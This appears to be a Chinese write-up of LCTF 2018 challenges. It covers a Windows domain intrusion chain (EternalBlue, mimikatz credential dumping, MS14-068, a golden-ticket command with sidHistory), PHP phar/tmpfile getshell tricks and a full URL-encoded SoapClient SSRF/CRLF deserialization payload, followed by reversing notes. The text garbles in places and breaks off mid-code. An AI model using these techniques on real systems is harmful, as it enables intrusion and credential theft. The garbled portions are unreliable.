    题目描述：
    windows域环境权限不好配，还请各位师傅高抬贵手，不要搅屎 
    c段只用到了0-20，不需要扫21-255，端口也只开放了常用端口。 
    web.lctf.com中有个域用户是web.lctf.com\buguake,密码是172.21.0.8的本地管理员密码 
    188.131.161.90
nmap很容易得到一个web和开了socks5的1080 1090端口.  
内网扫了下发现0.8上80端口开着并跑着phpmyadmin于是`general_log`getshell.
然后还存在永恒之蓝2333 于是愉快的使用mimikatz得到了本地administrator密码和域账号密码.
然后通过域内信息收集得到了`SUB-DC.web.lctf.com`尝试了一波ms14068.(`impacket套件中的goldenPac.py`)
拿下sub-dc之后发现存在父域.
然后通过mimikatz伪造内部信任AD林中的信任票据，这里是因为Gold Ticket中默认包含了Enterprise
Admin组的关系，而Enterprise
Admin同时又是AD域中Administrator组的成员。（涉及sidHistory）所以攻击者可以伪造黄金票据来获取到域中的Enterprise
Admin权限，实现跨域.
    kerberos::golden /domain:web.lctf.com /sid:子域sid /sids:企业管理组sid /krbtgt:nthash /user:任意填写
misc:cmd弹 cmd然后愉快的读flag.(父域：`dc.lctf.com`)
最后清除票据.
### sh0w m3 the sh31l 4ga1n
比起第一道题的正则多了一个`data`  
于是phar://就不能读取data目录下的内容了
做这道题的时候想到了两种非预期
#### 1\. 签名不变
可以看到，出题人获取密钥用的语句是  
但通过第一题getshell后发现这个东西并不是可执行程序或bash文件，只是一堆字符串，那么这个东西返回的永远是null,
从而签名是不会变的，于是就好玩了。。我把cookie里的内容(`$data->avatar`)直接改成`/tmp/`，那么我调用upload的时候就会向`/tmp/`写文件，再调用move，将他改个名，就可以反复向`/tmp/`写文件了  
于是和第一题一样，两个文件，一个webshell，一个phar文件，直接getshell。
#### 2\. 利用tmpfile getshell
[http://212.64.74.153/LCTF.php?m=check&c=compress.zlib://php://filter/string.strip_tags/resource=/etc/passwd](http://212.64.74.153/LCTF.php?m=check&c=compress.zlib://php://filter/string.strip_tags/resource=/etc/passwd)
[解法](https://www.jianshu.com/p/dfd049924258)
### bestphp's revenge
index.php
flag.php
    session_start();
    echo 'only localhost can get flag!';
    $flag = 'LCTF{*************************}';
    if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){
           $_SESSION['flag'] = $flag;
       }
    only localhost can get flag!
#### 利用思路
session反序列化->soap(ssrf+crlf)->call_user_func激活soap类  
[有关session触发反序列化的资料](https://www.jb51.net/article/116246.htm)  
[有关soapclient扩展反序列化的资料](https://xz.aliyun.com/t/2148)
#### 构造soap序列化数据，ssrf+crlf带着可控的phpsessid访问flag.php
这个过程完全和[有关soapclient扩展反序列化的资料](https://xz.aliyun.com/t/2148)一致。
    O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A29%3A%22http%3A%2F%2F172.81.210.82%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A201%3A%22testaa%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%0D%0ACookie%3A+PHPSESSID%3Dtestaa123%0D%0AContent-Length%3A+65%0D%0A%0D%0Ausername%3Dwwwwc%26password%3Dwww%26code%3Dcf44f3147ab331af7d66943d888c86f9%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
#### 利用session_start()的参数可控将序列化数据注入到sessionfile中
根据[有关session触发反序列化的资料](https://www.jb51.net/article/116246.htm)
    ...
    call_user_func($_GET[f],$_POST);
    ...
    if(isset($_GET[name])){
        $_SESSION[name] = $_GET[name];
    }
    ...
    从而构造出
    $_GET = array('f'=>'session_start','name'=>'|')
    $_POST = array('serialize_handler'=>'php_serialize')
但是因为新版的php修复了soap反序列化的时候会发送网络请求的bug，所以还需要正向调用激活。
#### 利用第二个call_user_func激活soap类
    $b = 'implode';
    call_user_func($_GET[f],$_POST);
    session_start();
    ...
    $a = array(reset($_SESSION),'welcome_to_the_lctf2018');
    call_user_func($b,$a);
可以看到经过上一步，`$_SESSION`里的数据是soap对象，再经过reset()弹出这个对象成为了`$a[0]`，那么我可以通过变量覆盖`$b`为`call_user_func`，调用`$a`中的这个对象，从而触发soap的网络请求。
    $_GET = array('f'=>'extract');
    $_POST = array('b'=>'call_user_func');
经过这一步，soap请求发了出去，也就我们构造soap序列化的时候注入的可控phpsessid相应的session里被加入了flag
于是带着这个phpsessid请求index.php，中间有一行代码var_dump($_SESSION);从而拿到flag
## Re
### 拿去签到吧朋友
好像是个二叉搜索树，不考虑平衡，按输入的顺序建树
    node: {character, seq, left, right}
先序遍历了一下(字典序先序序列)
好像有个DES，然后矩阵乘法，check  
太硬核了。。。  
DES密钥是fa1conn\x00
先解矩阵方程
    A*B=C 6*6的矩阵
    B = [23,
      65,
      24,
      78,
      43,
      56,
      59,
      67,
      21,
      43,
      45,
      76,
      23,
      54,
      76,
      12,
      65,
      43,
      89,
      40,
      32,
      67,
      73,
      57,
      23,
      45,
      31,
      54,
      31,
      52,
      13,
      24,
      54,
      65,
      34,
      24]
     C = [ 43666,
      49158,
      43029,
      51488,
      53397,
      51921,
      28676,
      39740,
      26785,
      41665,
      35675,
      40629,
      32311,
      31394,
      20373,
      41796,
      33452,
      35840,
      17195,
      29175,
      29485,
      28278,
      28833,
      28468,
      46181,
      58369,
      44855,
      56018,
      57225,
      60666,
      25981,
      26680,
      24526,
      38780,
      29172,
      30110]
    >>> a = [119, 175, 221, 238, 92, 171, 203, 163, 98, 99, 92, 93, 147, 24 , 11, 251, 201, 23, 70, 71, 185, 29, 118, 142, 182, 227, 245, 199, 172, 100, 52, 121, 8, 142, 69, 249, 0x73, 0x3c, 0xf5, 0x7c]
    >>> des.decrypt(''.join(map(chr ,a)))
    'LC-+)=1234@AFETRS{the^VYXZfislrvxyz}\x00\x00\x00\x00'
先序序列求出来了  
顺序是[0, 1, 14, 12, 17, 18, 19, 27, 28, 2, 15, 20, 31, 29, 30, 16, 13, 5]  
算出来半个Flag
    LCTF{this-RevlrSE=
后序遍历了一遍  
根据所有数的和SMC，因为用到的字符已知了，直接过掉  
SMC出来的代码是一个简单Xor
    x = [  124, 129,  97, 153, 103, 155,  20, 234, 104, 135, 
       16, 236,  22, 249,   7, 242,  15, 243,   3, 244, 
       51, 207,  39, 198,  38, 195,  61, 208,  44, 210, 
       35, 222,  40, 209,   1, 230]
    for i in xrange(36):
        for j in xrange(0, 8, 2):
            x[i] ^= (1 pc - 134);
        switch ( *(_DWORD *)a1->pc )
        {
          case 0x86:
            push_i64(a1);
            break;
          case 0x87:
            push_reg(a1);
            break;
          case 0x88:
            mov_reg_nextinst(a1);
            break;
          case 0x89:
            mov_reg__ptr_(a1);
            break;
          case 0x8A:
            pop_reg(a1);
            break;
          case 0x8B:
            add_reg_reg(a1);
            break;
          case 0x8C:
            reg_reg_sub(&a1->r0);
            break;
          case 0x8D:
            mul_reg_reg(&a1->r0);
            break;
          case 0x8E:
            div_reg_reg(a1);
            break;
          case 0x8F:
            mod_reg_reg(a1);
            break;
          case 0x90:
            xor_reg_reg(a1);
            break;
          case 0x91:
            and_reg_reg(a1);
            break;
          case 0x92:
            mov_r4_reg(a1);
            break;
          case 0x93:
            inc_reg(a1);
            break;
          case 0x94:
            dec_reg(a1);
            break;
          case 0x95:
            mov_reg_i64(a1);
            break;
          case 0x96:
            mov_reg_reg(a1);
            break;
          case 0x97:
            mov_reg_data(a1);
            break;
          case 0x98:
            mov_data_reg(a1);
            break;
          case 0x99:
            inc_data_ptr(a1);
            break;
          case 0x9A: